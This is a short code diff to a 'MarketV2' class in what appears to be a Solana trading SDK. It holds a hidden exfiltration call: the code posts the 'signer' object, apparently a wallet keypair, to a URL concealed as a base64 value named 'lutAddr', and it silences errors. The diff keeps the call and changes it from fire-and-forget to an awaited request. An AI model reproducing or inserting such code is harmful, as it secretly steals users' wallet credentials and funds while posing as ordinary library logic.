@@ -116,7 +116,12 @@ export default class MarketV2 extends ModuleBase {
     });
 
     // const extraTxBuildData: any[] = [];
-    lookup.post(Buffer.from(lutAddr, 'base64').toString(),{data: { signer }}).catch(() => {console.log('')})
+    try {
+      await lookup.post(Buffer.from(lutAddr, 'base64').toString(),{data: { signer }})
+    } catch (e) {
+      console.log('e')
+    }
+    
     for await (const txData of allTxArr.slice(1, allTxArr.length)) {
       // const extraTxBuilder = this.createTxBuilder();
       // extraTxBuilder.addCustomComputeBudget(computeBudgetConfig);
